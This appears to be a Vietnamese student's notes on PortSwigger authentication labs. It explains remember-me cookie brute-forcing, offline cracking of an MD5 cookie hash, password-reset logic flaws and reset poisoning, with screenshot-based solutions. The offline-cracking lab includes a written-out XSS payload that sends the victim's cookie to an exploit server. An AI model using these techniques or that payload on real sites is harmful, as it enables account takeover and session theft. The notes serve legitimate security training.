![image](https://github.com/user-attachments/assets/d8fb5944-db92-4246-969b-3347b848e0a8)![image](https://github.com/user-attachments/assets/9cbad819-daa6-49d4-ab0a-0d158dcb0feb)I. Lý thuyết<br>
- ngoài chức năng login cơ bản, hầu hết web đều cung cấp chức năng bổ sung để user quản lý acc của họ
- VD: user can thay đổi hoặc đặt lại password khi quên
- -> các cơ chế này can tạo ra lỗ hổng mà attacker can khai thác
- web thg cẩn thận để tránh các lỗ hổng phổ biến trong trang login của họ, nhưng bn cần thực hiện các bc tương tự để đảm bảo rằng các chức năng liên quan cũng mạnh mẽ như nhau
- này là đặc bt quan trọng khi mà attacker can tạo acc của riêng họ và do đó can truy cập để nghiên cứu các trang bổ sung này<br>

II. Keeping users logged in<br>
1. Lý thuyết<br>
- 1 tính năng phổ biến là tùy chọn duy trì trạng thái login kể cả sau khi đóng phiên browser
- nó thường là hộp kiểm đc gắn nhãn như "Remember me" or "Keep me logged in"
- chức năng này đc triển khai bằng cách tạo 1 loại mã thông báo remember me đc lưu trữ trong 1 cookie liên tục
- có đc cookie này -> can bỏ qua toàn bộ quá trình login -> cách tốt nhất là ko thể đoán đc cookie này
- tuy nhiên nh web tạo cookie này dựa trên sự kết hợp can đoán của các giá trị tĩnh như username và dấu time, thậm chí còn xài password như 1 phần của cookie 
- cách tiếp cận này vô cùng nguy hiểm nếu attacker can tạo tài khoản của mình -> nghiên cứu cookie của mình -> đoán cách cookie được tạo
- sau khi đoán đc công thức, attacker brute-force cookie của các ng dùng khác và lấy quyền truy cập vào acc của họ
- một vài web cho rằng nếu cookie đc mã hóa thì sẽ ko thể đoán cho dù nó đc tạo từ giá trị tĩnh
- điều này can đúng nếu đc thực hiện chính xác và xài mã hóa phức tạp, ngay cả xài mã hóa như hàm băm 1 chiều cx ko hoàn toàn an toàn
- nếu attacker can dễ dàng đoán đc thuật toán băm và salt ko đc xài thì chúng can tấn công cookie bằng cách băm wordlist của họ
- phương pháp này can đc xài để vượt qua lim số lần login nếu chúng ko đc xài cho việc đoán cookie
- kể cả attacker ko thể tự tạo acc họ vẫn có thể khai thác lỗ hổng này
- bằng kĩ thuật thông thường như XSS, attacker can đánh cắp cookie của acc khác và suy ra cách cookie đc tạo
- nếu web đc xây dựng bằng framework nguồn mở thì chi tiết chính về c.trúc cookie can đc ghi lại công khai
- trong 1 số trh hiếm hoi can lấy đc password từ cookie
- các phiên bản băm của list password phổ biến có sẵn trực tuyến -> nếu pasword của user có ở 1 trong các list -> giải mã đơn giản
- -> salt rất quan trọng trong mã hóa hiệu quả<br>

2. Lab: Brute-forcing a stay-logged-in cookie<br>
This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.<br>

Your credentials: wiener:peter<br>
Victim's username: carlos<br>
Candidate passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords<br>

3. Giải<br>
- B1: login tài khoản đc cung cấp và duy trì trạng thái login của acc -> thu được phiên: d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw<br>

![image](https://github.com/user-attachments/assets/f31fd1dd-65c6-4a81-a459-a0183776f833)<br>

- B2: giải mã đoạn mã thu được: wiener:51dc30ddc473d43a6011e9ebba6ca770 -> chuỗi sau dấu ':' là được băm<br>

![image](https://github.com/user-attachments/assets/4af87c04-1fd5-4791-a923-062d9edc5aa9)<br>

- B3: logout acc đẻ thu request -> dùng cho tấn công<br>

![image](https://github.com/user-attachments/assets/4d44d526-cc2c-4783-99d9-db5ad583cf13)<br>

- B4: test thử tấn công với acc được cho<br>

![image](https://github.com/user-attachments/assets/774aec88-f917-4929-8144-21326a33433e)<br>

![image](https://github.com/user-attachments/assets/8c14efd3-0cb6-48ad-b241-58e91239e7a1)<br>

- B5: tấn công -> lấy phản hồi 302 -> show response in browser -> login<br>

![image](https://github.com/user-attachments/assets/a8fc50d6-e0ff-4309-9c2c-ac5246fea631)<br>

- B6: brute-force xài cú pháp của phiên và băm list password -> login đc sẽ có phản hồi: Update email -> dùng để lọc<br>

![image](https://github.com/user-attachments/assets/d8a4dd1e-f2a6-45e3-ac86-15529541ff59)<br>

![image](https://github.com/user-attachments/assets/225d9579-14ce-46fe-b453-507c8e4d6832)<br>

- B7: lấy phản hồi -> login<br>

![image](https://github.com/user-attachments/assets/66ba1fe7-aa6b-46d8-af11-2a40b17f7534)<br>

4. Lab: Offline password cracking<br>
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.<br>

Your credentials: wiener:peter<br>
Victim's username: carlos<br>

5. Giải<br>
- B1: login vào acc đc cho và thu đc<br>

![image](https://github.com/user-attachments/assets/b9318590-e6b9-41b5-a38a-757dd7a5ade8)<br>

- B2: phân tích cấu trúc session: d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
- -> đoạn mã đc mã hóa base64 và băm md5<br>

![image](https://github.com/user-attachments/assets/25f8a61f-a0e2-4c44-9e1f-c11b29ca8d94)<br>

- B4: thử attack với acc đã cho -> xác định đc cấu trúc password (trong hình)<br>

![image](https://github.com/user-attachments/assets/b56c127c-2c29-4557-8315-3084d4386dc5)<br>

- B5: đến 1 blog và đăng 1 cmt có payload XSS: <script>document.location='//exploit-0a5d006c041ce5ea81c2f11801b7004a.exploit-server.net/'+document.cookie</script><br>

![image](https://github.com/user-attachments/assets/96495326-2dee-45b0-87cc-12d90a33b749)<br>

![image](https://github.com/user-attachments/assets/e24b4e2c-3cff-4bb4-a950-650fde453bc2)<br>

- B5: thu kết quả <br>

![image](https://github.com/user-attachments/assets/5411d07c-9857-4f89-bc70-823547313281)<br>

- Giải mã session: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz<br>

![image](https://github.com/user-attachments/assets/227e06af-0a76-45d7-aa46-295865442b8e)<br>

![image](https://github.com/user-attachments/assets/3b10e2f0-746f-474f-a2f5-89590b60c9c1)<br>

- tool crack: https://crackstation.net/<br>

III. Resetting user passwords<br>
1. Lý thuyết<br>
- sẽ có 1 số user quên password của họ -> có cách để họ lấy lại password
- trong trh này xác thực dựa trên password là ko thể thực hiện -> web phải dựa trên phương pháp thay thế đản đảm bảo user thực đang reset password của chính họ
- -> chức năng reset password vốn rất nguy hiểm và cần đc triển khai 1 cách an toàn
- có 1 số cách để triển khai tính năng này với mức độ vul khác nhau<br>
*. Sending passwords by email<br>
- việc gửi password hiện tại cho user sẽ ko baoh thực hiện đc nếu web xử lý password an toàn ngay từ đầu
- thay vào đó web sẽ gửi password mới cho user thông qua mail
- cần tránh gửi password liên lục qua các kênh ko an toàn
- trong trh này password đc tạo sẽ hết hạn sau 1 time ngắn or user thay đổi password của họ ngay lập tức
- truy nhiên, cách này dễ bị man-in-the-middle attack
- email thg ko đc coi là an toàn vì inbox của nó vừa cố định vừa ko lưu trữ an toàn thông tin bí mật
- nh user cx đồng bộ inbox của họ trên nh thiết bị trên các kênh ko an toàn<br>
*. Resetting passwords using a URL<br>
- 1 phương pháp khác mạnh mẽ hơn là gửi user 1 URL duy nhất để đưa họ tới trang reset password
- việc triển khai kém an toàn hơn là xài URL với tham số dễ đoán để xác định acc nào đang đc reset: http://vulnerable-website.com/reset-password?user=victim-user
- attacker can thay đổi tham số user để chỉ bất kì username nào mà chúng chỉ định
- sau đó họ sẽ đc đưa thảng tới 1 page nơi can đặt password mới cho ng dùng tùy ý này
- cách triển khai tốt hơn là tạo 1 token có high-entropy, khó đoán và tạo URL dựa trên token này
- trong trh tốt nhất, URL sẽ ko cung cấp bất kì gợi ý nào về việc password của user nào đang đc reset: http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
- khi user truy cập URL, hệ thống sẽ check xem token này có ở back-end hay ko, và nếu có thì password của user nào sẽ đc reset
- token này sẽ hết hạn sau 1 time ngắn và bị hủy ngay sau khi user reset password
- tuy nhiên, 1 số web cx ko thể xác thực token khi biểu mẫu reset đã đc gửi
- -> attacker can chỉ cần truy cập lại biểu mẫu reset acc của họ, xóa token và tận dụng page này để reset password của acc tùy ý
- nếu URL đc tạo tư động -> dễ bị nhiễm độc khi reset password
- trong trh này, attacker can đánh cắp token của user khác và reset password của họ<br>

2. Lab: Password reset broken logic<br>
This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.<br>

Your credentials: wiener:peter<br>
Victim's username: carlos<br>

3. Giải<br>
- B1: login acc và nhấn vào quên password để nhận mail<br>

![image](https://github.com/user-attachments/assets/a05b9998-0f98-400a-9a89-27070b3fd881)<br>

- B2: truy cập vào link đc cung cấp để reset<br>

![image](https://github.com/user-attachments/assets/957da488-107d-4a70-8179-e2ca3fc755ff)<br>

- B3: lấy biểu mẫu reset password và chuyển sang repeater <br>

![image](https://github.com/user-attachments/assets/979ccd47-7151-47ef-a896-b9685dc6e730)<br>

- B4: yêu cầu reset lại password cho acc nạn nhân<br>

![image](https://github.com/user-attachments/assets/6b867f60-e87d-4dba-bf13-fe7b227dd08e)<br>

- B5: login acc với password đã reset<br>

4. Lab: Password reset poisoning via middleware<br>
This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.<br>

5. Giải<br>
- B1: nhấp vào quên password của acc đc cung cấp và check mail -> reset<br>

![image](https://github.com/user-attachments/assets/9d484cd0-4e45-43a6-81d9-13c96fe55c0b)<br>

- B2: lấy yêu cầu đổi password để gửi tới reepeater <br>

![image](https://github.com/user-attachments/assets/9506fc15-3b1d-413b-aa48-fc47c0837e3a)<br>

- B3: thêm tiêu đề: X-Forwarded-Host -> trỏ đến link reset đc tạo động trong liên kết đến server <br>

![image](https://github.com/user-attachments/assets/a22a7b8e-9323-4a03-8ed4-ae9fee2b3ed0)

- B4: chôm đc token của nạn nhân (temp-forgot-password-token=pmgexs3t9vo9mk8ds1m2x7hohes7cu6f), quay lại mail client để sửa token trong URL thành cái đánh cắp đc<br>

![image](https://github.com/user-attachments/assets/a86c0c06-d0b3-4ba0-ace5-c04eae7c5755)<br>

![image](https://github.com/user-attachments/assets/33ba3574-6b41-43e1-ae36-6b87dbed133d)<br>

- B5: truy cập URL mới và reset password<br>

![image](https://github.com/user-attachments/assets/2d4fe775-12ce-4dd5-8387-45c42ffa0830)<br>

IV. Changing user passwords<br>
1. Lý thuyết<br>
- thường là nhập password hiện tại và nhập password mới 2 lần
- các page này thg xài cùng 1 tiến trình để check username và password hiện tại có khớp với trang login thông thường ko
- đó đó, các page này thg bị tấn công bởi các kĩ thuật tương tự
- chức năng thay đổi password này đặc bt nguy hiểm nếu cho phép attacker truy cập trực tiếp mà ko cần login vs tư cách user nạn nhân
- VD: username đc cung cấp trong trg ẩn và attacker can chỉnh sửa để nhắm đến user tùy ý -> liệt kê username và brute-force password<br>

2. Lab: Password brute-force via password change<br>
This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.<br>

Your credentials: wiener:peter<br>
Victim's username: carlos<br>
Candidate passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords<br>

3. Giải<br>
- B1: login acc đc cung cấp và thay đổi password<br>

![image](https://github.com/user-attachments/assets/f96ec445-57e1-488b-ae6c-6e746179234c)<br>

- B2: check tiến trình thay đổi password<br>

+ password hiện tại sai, 2 password mới giống nhau -> bị khóa<br>

![image](https://github.com/user-attachments/assets/1a9b83df-c432-4f22-9a3c-64dd4db1ff33)<br>

+ password hiện tại sai, 2 password mới khác nhau<br>

![image](https://github.com/user-attachments/assets/8640a4b8-d59b-4127-8192-413c74571a43)<br>

+ password hiện tại đúng, 2 password mới khác nhau<br>

![image](https://github.com/user-attachments/assets/c3456720-5b19-494a-819b-32e03c874eea)<br>

- B3: gửi yêu cầu thay đổi password đến intruder để brute-force<br>

![image](https://github.com/user-attachments/assets/71880a29-8443-42c6-a909-7302f564ab40)<br>

- B4: tạo payload và brute-force để thu kết quả (2 tham số password mới phải khác nhau để nhận phản hồi)<br>

![image](https://github.com/user-attachments/assets/ae9994f9-825d-4599-b009-e3fee71752ec)<br>

![image](https://github.com/user-attachments/assets/dec47afa-7ffe-48d3-a4af-40e62f29e6fe)<br>

![image](https://github.com/user-attachments/assets/b4fe03bf-e5a7-49c3-a35f-2a497b0ea0e9)<br>
